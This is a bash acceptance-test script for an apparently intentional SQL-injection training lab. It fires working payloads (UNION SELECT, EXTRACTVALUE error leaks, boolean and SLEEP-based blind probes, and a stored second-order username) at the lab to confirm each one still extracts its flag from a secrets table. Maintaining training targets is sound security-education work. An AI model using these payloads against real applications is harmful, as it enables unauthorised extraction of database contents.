#!/usr/bin/env bash
# Acceptance checks for sqli.vulnlab.dev.
#
# Verifies that each lab's canonical exploit actually extracts (or proves
# extraction is possible for) its per-lab VULNLAB{...} flag from the
# secrets table, and that /source/+/meta/ are reachable for every lab.
#
# Usage:
#   ./scripts/check-sqli.sh                       # checks https://sqli.vulnlab.dev
#   BASE_URL=http://127.0.0.1:8084 ./scripts/check-sqli.sh
#
# Exit code 0 = all pass. Nonzero = at least one regression.
set -u

BASE_URL="${BASE_URL:-https://sqli.vulnlab.dev}"
CURL_OPTS=(--silent --show-error --max-time 30)

pass=0
fail=0
failures=()

expect_body() {
    local label="$1" url="$2" needle="$3"
    local body
    body="$(curl "${CURL_OPTS[@]}" "$url" 2>&1)" || true
    if printf '%s' "$body" | grep -qF -- "$needle"; then
        printf '  \e[32mOK\e[0m   %s\n' "$label"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s\n' "$label"
        printf '       wanted: %s\n' "$needle"
        printf '       got:    %s\n' "$(printf '%s' "$body" | head -c 300)"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

expect_status() {
    local label="$1" url="$2" want="$3"
    local code
    code="$(curl --silent --output /dev/null --max-time 15 --write-out '%{http_code}' "$url" || true)"
    if [[ "$code" == "$want" ]]; then
        printf '  \e[32mOK\e[0m   %s (got %s)\n' "$label" "$code"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s (wanted %s, got %s)\n' "$label" "$want" "$code"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

section() { printf '\n\e[1m== %s ==\e[0m\n' "$1"; }

# --- 1. union ----------------------------------------------------------------

section "Union-based"

union_body="$(curl "${CURL_OPTS[@]}" --get \
    --data-urlencode "category=widgets' UNION SELECT name, value, 0 FROM secrets-- " \
    "$BASE_URL/union/" 2>&1)" || true
if printf '%s' "$union_body" | grep -qF -- "VULNLAB{sqli-union-based-extraction}"; then
    printf '  \e[32mOK\e[0m   union: secret extracted via UNION SELECT\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m union: did not extract\n'
    fail=$((fail + 1))
    failures+=("union extraction")
fi

# --- 2. error ----------------------------------------------------------------

section "Error-based"

# MariaDB EXTRACTVALUE truncates the error text to ~31 chars after the ~
# marker, so we match a substring of the flag, not the full thing.
err_body="$(curl "${CURL_OPTS[@]}" -X POST \
    --data-urlencode "username=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM secrets WHERE name='sqli-error')))-- " \
    --data-urlencode "password=x" \
    "$BASE_URL/error/" 2>&1)" || true
if printf '%s' "$err_body" | grep -qF -- "VULNLAB{sqli-error-based"; then
    printf '  \e[32mOK\e[0m   error: EXTRACTVALUE leaked flag into SQL error\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m error: did not extract\n'
    printf '       got: %s\n' "$(printf '%s' "$err_body" | grep -i 'SQL error\|MySQL\|MariaDB' | head -2)"
    fail=$((fail + 1))
    failures+=("error extraction")
fi

# --- 3. blind-bool -----------------------------------------------------------

section "Blind boolean oracle"

# True branch: first char of secret == 'V' -> product row returned.
true_body="$(curl "${CURL_OPTS[@]}" --get \
    --data-urlencode "id=1 AND SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-bool'),1,1)='V'" \
    "$BASE_URL/blind-bool/" 2>&1)" || true
if printf '%s' "$true_body" | grep -qF -- 'Widget Pro'; then
    printf '  \e[32mOK\e[0m   blind-bool: TRUE branch returns the product row\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m blind-bool: TRUE branch did not return product\n'
    fail=$((fail + 1))
    failures+=("blind-bool true")
fi

# False branch: first char == 'X' -> "not found".
false_body="$(curl "${CURL_OPTS[@]}" --get \
    --data-urlencode "id=1 AND SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-bool'),1,1)='X'" \
    "$BASE_URL/blind-bool/" 2>&1)" || true
if printf '%s' "$false_body" | grep -qF -- 'Not found'; then
    printf '  \e[32mOK\e[0m   blind-bool: FALSE branch returns "Not found"\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m blind-bool: FALSE branch did not return "Not found"\n'
    fail=$((fail + 1))
    failures+=("blind-bool false")
fi

# --- 4. blind-time -----------------------------------------------------------

section "Blind time-based"

# True branch should SLEEP(2). Measure elapsed time.
t_start=$(date +%s%N)
curl "${CURL_OPTS[@]}" --get \
    --data-urlencode "username=nope' UNION SELECT IF(SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-time'),1,1)='V',SLEEP(2),'x')-- " \
    "$BASE_URL/blind-time/" -o /dev/null
t_end=$(date +%s%N)
elapsed_ms=$(( (t_end - t_start) / 1000000 ))
if (( elapsed_ms >= 1800 && elapsed_ms < 10000 )); then
    printf '  \e[32mOK\e[0m   blind-time: TRUE branch took %dms (SLEEP(2) fired)\n' "$elapsed_ms"
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m blind-time: TRUE branch took %dms (expected ~2000ms)\n' "$elapsed_ms"
    fail=$((fail + 1))
    failures+=("blind-time true")
fi

# False branch should be fast.
t_start=$(date +%s%N)
curl "${CURL_OPTS[@]}" --get \
    --data-urlencode "username=nope' UNION SELECT IF(SUBSTRING((SELECT value FROM secrets WHERE name='sqli-blind-time'),1,1)='X',SLEEP(2),'x')-- " \
    "$BASE_URL/blind-time/" -o /dev/null
t_end=$(date +%s%N)
elapsed_ms=$(( (t_end - t_start) / 1000000 ))
if (( elapsed_ms < 1000 )); then
    printf '  \e[32mOK\e[0m   blind-time: FALSE branch took %dms (no sleep)\n' "$elapsed_ms"
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m blind-time: FALSE branch took %dms (should be <1000ms)\n' "$elapsed_ms"
    fail=$((fail + 1))
    failures+=("blind-time false")
fi

# --- 5. second-order ---------------------------------------------------------

section "Second-order"

# Use # rather than `-- ` because the register handler strips trailing
# whitespace; MariaDB's -- comment needs a trailing space, # does not.
# Append an epoch suffix after the # so each script run gets a unique
# username (the users.username column has a UNIQUE constraint; the suffix
# is inside a SQL comment so the injected payload still parses the same).
payload="' UNION SELECT value FROM secrets WHERE name='sqli-second-order'#$(date +%s%N)"
reg_body="$(curl "${CURL_OPTS[@]}" -X POST --data-urlencode "username=${payload}" \
    "$BASE_URL/second-order/register" 2>&1)" || true
new_id="$(printf '%s' "$reg_body" | grep -oE 'user id <code>[0-9]+' | grep -oE '[0-9]+$' | head -1)"

if [[ -z "$new_id" ]]; then
    printf '  \e[31mFAIL\e[0m second-order: registration did not return a new id\n'
    printf '       fragment: %s\n' "$(printf '%s' "$reg_body" | grep -iE 'error|new_id' | head -1)"
    fail=$((fail + 1))
    failures+=("second-order register")
else
    printf '  \e[32mOK\e[0m   second-order: registered as user id %s\n' "$new_id"
    pass=$((pass + 1))

    profile_body="$(curl "${CURL_OPTS[@]}" "$BASE_URL/second-order/profile?id=$new_id" 2>&1)" || true
    if printf '%s' "$profile_body" | grep -qF -- "VULNLAB{sqli-second-order-via-stored-input}"; then
        printf '  \e[32mOK\e[0m   second-order: stored payload extracted secret via profile join\n'
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m second-order: profile view did not surface flag\n'
        fail=$((fail + 1))
        failures+=("second-order extraction")
    fi
fi

# --- source + meta coverage --------------------------------------------------

section "Source + meta coverage"

SLUGS=(union error blind-bool blind-time second-order)
for slug in "${SLUGS[@]}"; do
    expect_status "/source/$slug" "$BASE_URL/source/$slug" "200"
done
for slug in "${SLUGS[@]}"; do
    body="$(curl "${CURL_OPTS[@]}" "$BASE_URL/meta/$slug" 2>&1)" || true
    if printf '%s' "$body" | grep -q '"detect"'; then
        printf '  \e[32mOK\e[0m   /meta/%s has detect block\n' "$slug"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m /meta/%s missing detect block\n' "$slug"
        fail=$((fail + 1))
        failures+=("/meta/$slug")
    fi
done

# --- summary -----------------------------------------------------------------

section "Summary"
printf '  passed: %d\n  failed: %d\n' "$pass" "$fail"

if (( fail > 0 )); then
    printf '\n\e[31mFAILURES:\e[0m\n'
    for f in "${failures[@]}"; do
        printf '  - %s\n' "$f"
    done
    exit 1
fi
exit 0
